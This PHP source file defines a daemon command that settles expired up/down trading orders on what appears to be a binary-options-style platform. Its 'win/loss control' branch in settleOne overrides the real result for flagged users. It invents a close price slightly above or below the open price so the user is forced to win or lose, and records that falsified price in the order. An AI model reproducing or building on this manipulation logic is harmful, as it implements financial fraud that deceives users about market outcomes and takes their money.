<?php

namespace app\admin\command;

use app\common\model\Order;
use app\common\model\Product;
use app\common\model\User;
use app\common\model\UserAccount;
use think\console\Command;
use think\console\Input;
use think\console\Output;
use think\Db;
use think\Log;

/**
 * 订单自动结算定时任务
 * 用法: php think settle_order
 * 支持输赢控制，逻辑对齐旧项目
 */
class SettleOrder extends Command
{
    protected function configure()
    {
        $this->setName('settle_order')->setDescription('Settle expired orders (daemon)');
    }

    protected function execute(Input $input, Output $output)
    {
        $output->info('订单结算守护进程已启动，每秒轮询到期订单...');

        while (true) {
            try {
                $this->settleOnce($output);
            } catch (\Exception $e) {
                Log::error('settle_order loop error: ' . $e->getMessage());
                $output->error($e->getMessage());
            }
            sleep(1);
        }
    }

    /**
     * 单次轮询结算
     */
    protected function settleOnce(Output $output)
    {
        $now = time();
        $orders = Order::where('status', 0)
            ->where('settle_time', '<=', $now)
            ->limit(100)
            ->select();
        if (!$orders || count($orders) == 0) {
            return;
        }
        $settled = 0;
        $failed = 0;
        foreach ($orders as $order) {
            try {
                $this->settleOne($order);
                $settled++;
            } catch (\Exception $e) {
                $failed++;
                Log::error("settle {$order->order_no}: " . $e->getMessage());
            }
        }
        if ($settled || $failed) {
            $output->info(date('H:i:s') . " settled:{$settled} failed:{$failed}");
        }
    }

    /**
     * 结算单个订单
     */
    protected function settleOne($order)
    {
        $product = Product::get($order->product_id);
        if (!$product) {
            throw new \Exception('Product not found');
        }

        $closePrice  = $product->price;
        $openPrice   = $order->open_price;
        $tradeAmount = $order->trade_amount;
        $odds        = $order->odds / 100; // 收益率转小数
        $direction   = $order->direction;  // 0=买涨 1=买跌
        $userId      = $order->user_id;

        // 获取用户输赢控制
        $user = User::get($userId);
        $winControl = $user ? intval($user->win_control) : 0;

        // 判断涨跌结果: 1=赢 0=平 -1=输
        if ($direction == 0) {
            $result = $closePrice > $openPrice ? 1 : ($closePrice == $openPrice ? 0 : -1);
        } else {
            $result = $closePrice < $openPrice ? 1 : ($closePrice == $openPrice ? 0 : -1);
        }

        // 输赢控制：强制修改结果和结算价格
        if ($winControl == 1) {
            // 必赢：调整结算价确保赢
            $result = 1;
            $randomRate = mt_rand(2, 8) / 10000; // 0.02%-0.08%
            if ($direction == 0) {
                $closePrice = $openPrice + ($openPrice * $randomRate);
                if ($closePrice <= $openPrice) {
                    $closePrice = $openPrice + ($openPrice * 0.0002);
                }
            } else {
                $closePrice = $openPrice - ($openPrice * $randomRate);
                if ($closePrice >= $openPrice) {
                    $closePrice = $openPrice - ($openPrice * 0.0002);
                }
            }
        } elseif ($winControl == 2) {
            // 必输：调整结算价确保输
            $result = -1;
            $randomRate = mt_rand(2, 8) / 10000;
            if ($direction == 0) {
                $closePrice = $openPrice - ($openPrice * $randomRate);
                if ($closePrice >= $openPrice) {
                    $closePrice = $openPrice - ($openPrice * 0.0002);
                }
            } else {
                $closePrice = $openPrice + ($openPrice * $randomRate);
                if ($closePrice <= $openPrice) {
                    $closePrice = $openPrice + ($openPrice * 0.0002);
                }
            }
        }

        // 计算盈亏和返还金额
        if ($result == 1) {
            // 赢：盈利 = 本金 × 收益率，返还 = 本金 + 盈利
            $profit = round($tradeAmount * $odds, 2);
            $returnAmount = $tradeAmount + $profit;
            $orderResult = 1;
            $note = '交易盈利结算';
        } elseif ($result == 0) {
            // 平局：退还本金
            $profit = 0;
            $returnAmount = $tradeAmount;
            $orderResult = 2;
            $note = '交易平局退还';
        } else {
            // 输：亏损 = 本金 × 收益率，返还 = 本金 - 亏损
            $loss = round($tradeAmount * $odds, 2);
            $profit = -$loss;
            $returnAmount = $tradeAmount - $loss;
            $orderResult = 0;
            $note = '交易亏损结算';
        }

        $now = time();
        Db::startTrans();
        try {
            // 更新订单
            $order->save([
                'close_price' => round($closePrice, 6),
                'profit'      => $profit,
                'status'      => 1,
                'result'      => $orderResult,
                'close_time'  => $now,
            ]);
            // 返还资金（赢返本金+盈利，平退本金，输返本金-亏损）
            if ($returnAmount > 0) {
                $ret = UserAccount::changeBalance($userId, $returnAmount, 4, $order->order_no, $note);
                if (!$ret) {
                    throw new \Exception('Return balance failed');
                }
            }
            // 更新统计：亏损记录
            if ($orderResult == 0) {
                $account = UserAccount::where('user_id', $userId)->find();
                if ($account) {
                    $account->total_loss = function_exists('bcadd')
                        ? bcadd($account->total_loss, abs($profit), 2)
                        : $account->total_loss + abs($profit);
                    $account->save();
                }
            }
            Db::commit();
        } catch (\Exception $e) {
            Db::rollback();
            throw $e;
        }
    }
}
